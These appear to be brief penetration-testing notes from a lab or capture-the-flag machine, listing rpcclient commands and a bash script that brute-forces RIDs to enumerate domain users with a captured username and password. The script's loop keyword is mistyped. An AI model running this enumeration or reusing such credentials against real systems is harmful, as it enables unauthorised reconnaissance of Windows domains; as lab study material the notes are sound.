Some neat rpcclient commands:
- enumdomusers → users
- enumprivs → privs of a user
- srvinfo → server info like ip etc
- enumdomgroups → groups
- lsaenumsid → SIDs
- lookupsids → lookup an SID to get the matching username
- lsaquery

Brute forcing RIDs

Since we have 1 SID from the user hazard it’s possible to calculate the other SIDs using a bash script and enumerate all users
  • remove last 4 numbers
#!/bin/bash
sid="S-1-5-21-4254423774-1266059056-3197185112"

for i in `seq 1000 1020`; d
 rpcclient -U "hazard%stealth1agent" -c "lookupsids $sid-$i;quit" 10.10.10.149 | cut -d ' ' -f2
done
